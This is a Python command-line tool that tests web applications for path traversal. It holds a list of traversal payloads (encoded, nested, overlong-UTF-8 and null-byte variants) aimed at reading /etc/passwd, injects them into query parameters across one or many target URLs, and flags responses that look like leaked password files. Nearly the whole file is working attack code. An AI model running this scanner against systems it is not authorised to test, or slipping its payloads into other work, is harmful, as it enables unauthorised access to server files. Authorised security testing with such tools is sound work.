#!/usr/bin/env python3
"""
Dynamic Path Traversal Tester (GET)
-----------------------------------

A tool to test web applications for path traversal vulnerabilities by dynamically
injecting multiple traversal payloads into query parameters.

Features:
- Built-in payload techniques
- Load custom payloads from file
- Supports single or multiple URLs
- Verbose vs concise output
- Leak detection heuristic for /etc/passwd
- Option to preview snippet or full response
"""

import argparse
import sys
import time
import re
import ast
from urllib.parse import urlparse, parse_qs
import requests
from colorama import Fore, Style, init

# Initialize colorama for colored CLI output
init(autoreset=True)

# ================= Built-in Payload Techniques =================
TECHNIQUES = [
    ("T01", "Absolute path", lambda: "/etc/passwd"),
    ("T02", "Simple traversal ../ x6", lambda: "../../../../../../etc/passwd"),
    ("T03", "Nested traversal ....// x3", lambda: "....//....//....//etc/passwd"),
    ("T04", "Nested traversal ....\\/ x3", lambda: "....\\/....\\/....\\/etc/passwd"),
    ("T05", "Single URL-encoded ../ x3", lambda: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"),
    ("T06", "Double URL-encoded ../ x3", lambda: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"),
    ("T07", "Non-standard ..%c0%af x3", lambda: "..%c0%af..%c0%af..%c0%afetc/passwd"),
    ("T08", "Non-standard ..%ef%bc%8f x3", lambda: "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"),
    ("T09", "Base-dir bypass /var/www/images", lambda: "/var/www/images/../../../etc/passwd"),
    ("T10", "Null byte terminator png", lambda: "../../../etc/passwd%00.png"),
    ("T11", "Simple traversal x1 + common", lambda: "../common"),
    ("T12", "Simple traversal x2 + common", lambda: "../../common"),
]

USER_AGENT = "dynamic-path-traversal-tester/1.4"

# Regex to detect passwd-like lines
PASSWD_LINE_RX = re.compile(
    r'(?m)^[a-z_][a-z0-9_-]*:[^:]*:\d+:\d+:[^:]*:/[^:]*:/[^:\n]*\s*$'
)

# ================= Helper Functions =================
def build_get_url(base_url: str, param: str, value: str) -> str:
    sep = '&' if ('?' in base_url) else '?'
    return f"{base_url}{sep}{param}={value}"


def looks_like_etc_passwd(body: str) -> dict:
    """Heuristic detection of /etc/passwd content"""
    signals = 0
    if "root:x:0:0:" in body:
        signals += 2
    if "/bin/" in body:
        signals += 1
    if ":/home/" in body:
        signals += 1
    lines = PASSWD_LINE_RX.findall(body)
    if len(lines) >= 3:
        signals += 2

    matched = signals >= 3
    snippet = "\n".join(lines[:5]) if matched else ""
    return {"matched": matched, "score": signals, "snippet": snippet}


def load_custom_payloads(file_path):
    """Load custom payloads from file (tuple format: ID, desc, payload_str)"""
    techniques = []
    try:
        with open(file_path, "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                try:
                    t = ast.literal_eval(line.rstrip(","))
                    if isinstance(t, tuple) and len(t) == 3:
                        tid, desc, payload_str = t
                        # Wrap string in lambda so it is callable
                        techniques.append((tid, desc, lambda s=payload_str: s))
                except Exception as e:
                    print(f"{Fore.RED}[ERROR] Invalid line in {file_path}: {line} ({e}){Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Could not load custom payloads: {e}{Style.RESET_ALL}")
    return techniques

def test_target(session, url, params, delay, timeout, insecure, follow, verbose, techniques, show_full=False):
    """Run tests against one URL"""
    if verbose:
        print(f"\n[+] Target: {url}")
        print(f"[+] Params: {', '.join(params)}")
        print(f"[+] Techniques: {len(techniques)}\n")
    else:
        print(f"\n{Fore.CYAN}[TARGET]{Style.RESET_ALL} {url}")

    any_hit = False

    for param in params:
        for tid, desc, builder in techniques:
            payload = builder()
            test_url = build_get_url(url, param, payload)

            try:
                resp = session.get(
                    test_url,
                    timeout=timeout,
                    verify=not insecure,
                    allow_redirects=follow,
                )
                body = resp.text or ""
                det = looks_like_etc_passwd(body)

                status = resp.status_code
                size = len(body.encode("utf-8", errors="ignore"))

                if verbose:
                    print(f"{tid} | {desc} | param={param}")
                    print(f"    URL     : {test_url}")
                    print(f"    Status  : {status}  Size: {size} bytes")
                    if det["matched"]:
                        any_hit = True
                        print("    RESULT  : POSSIBLE /etc/passwd LEAK ✅")
                        if show_full:
                            print(f"---- FULL RESPONSE ----\n{body}\n-----------------------")
                        elif det["snippet"]:
                            for ln in det["snippet"].splitlines():
                                print(f"      > {ln}")
                    else:
                        print("    RESULT  : no match")
                    print()
                else:
                    if det["matched"]:
                        any_hit = True
                        print(f"{Fore.GREEN}[{tid}] {desc} ({param}) → POSSIBLE LEAK!{Style.RESET_ALL}")
                        if show_full:
                            print(f"---- FULL RESPONSE ----\n{body}\n-----------------------")
                        elif det["snippet"]:
                            print("    Snippet:")
                            for ln in det["snippet"].splitlines():
                                print(f"      > {ln}")
                    else:
                        print(f"{Fore.YELLOW}[{tid}] {desc} ({param}) → No match{Style.RESET_ALL}")

            except requests.RequestException as e:
                if verbose:
                    print(f"{tid} | {desc}")
                    print(f"    URL     : {test_url}")
                    print(f"    ERROR   : {e}\n")
                else:
                    print(f"{Fore.RED}[{tid}] {desc} ERROR: {e}{Style.RESET_ALL}")

            time.sleep(delay)

    if verbose:
        if any_hit:
            print("[!] At least one technique seems to expose /etc/passwd.")
        else:
            print("[✓] No evidence of /etc/passwd leak.")
    else:
        if any_hit:
            print(f"\n{Fore.RED}[!] At least one technique seems to expose /etc/passwd{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[✓] No /etc/passwd leak detected{Style.RESET_ALL}")


# ================= Main =================
def main():
    ap = argparse.ArgumentParser(
        description="Dynamic Path Traversal Tester (GET)"
    )
    ap.add_argument("-u", "--url", help="Target endpoint (ex: http://localhost:8080/download)")
    ap.add_argument("-p", "--param", help="Parameter name to inject (ex: filename). If not provided, all query params will be tested.")
    ap.add_argument("--list", help="File containing a list of URLs to test")
    ap.add_argument("--cp", help="Custom payload file (Python tuple format)")
    ap.add_argument("--delay", type=float, default=0.2, help="Delay between requests (s)")
    ap.add_argument("--timeout", type=float, default=10.0, help="Request timeout (s)")
    ap.add_argument("--insecure", action="store_true", help="Do not verify TLS")
    ap.add_argument("--follow", action="store_true", help="Follow redirects")
    ap.add_argument("--verbose", action="store_true", help="Verbose output (original format)")
    ap.add_argument("--full", action="store_true", help="Show full response when a leak is detected")
    args = ap.parse_args()

    urls = []
    if args.list:
        with open(args.list, "r") as f:
            urls = [line.strip() for line in f if line.strip()]
    elif args.url:
        urls = [args.url]
    else:
        print("[ABORT] You must provide -u/--url or --list")
        sys.exit(1)

    # Load built-in + custom payloads
    techniques = TECHNIQUES[:]
    if args.cp:
        custom = load_custom_payloads(args.cp)
        if custom:
            print(f"{Fore.CYAN}[INFO] Loaded {len(custom)} custom payloads from {args.cp}{Style.RESET_ALL}")
            techniques += custom

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT, "Accept": "*/*"})

    for url in urls:
        parsed = urlparse(url)
        query_params = list(parse_qs(parsed.query).keys())
        params_to_test = [args.param] if args.param else query_params or ["filename"]
        test_target(session, url, params_to_test, args.delay, args.timeout, args.insecure, args.follow, args.verbose, techniques, args.full)


if __name__ == "__main__":
    main()

